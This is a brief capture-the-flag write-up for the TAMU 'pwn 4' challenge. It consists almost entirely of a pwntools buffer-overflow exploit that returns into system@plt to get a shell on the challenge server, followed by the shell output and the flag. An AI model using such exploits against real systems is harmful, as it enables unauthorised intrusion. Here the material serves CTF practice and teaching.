# **pwn 4**

#### tag : pwnable

-----------------------------------------------

#### Description

>nc pwn.ctf.tamu.edu 4324

-----------------------------------------------

#### Solution

~~~

from pwn import *

DEBUG = False

if DEBUG:
	r = process('./pwn4')
	context.log_level = 'debug'
else:
	r = remote('pwn.ctf.tamu.edu', 4324)

system_plt = 0x08048430
secret = 0x0804A038

payload = ''
payload += 'a' * 32
payload += p32(system_plt)
payload += 'a' * 4
payload += p32(secret)

r.recvuntil('> ')
r.sendline(payload)
r.recvuntil('Command\n\n')
r.interactive()

~~~

~~~

[+] Opening connection to pwn.ctf.tamu.edu on port 4324: Done
[*] Switching to interactive mode
$ ls
flag.txt
pwn4
$ cat ./flag.txt
gigem{b4ck_70_7h3_l1br4ry}

~~~

**gigem{b4ck_70_7h3_l1br4ry}**
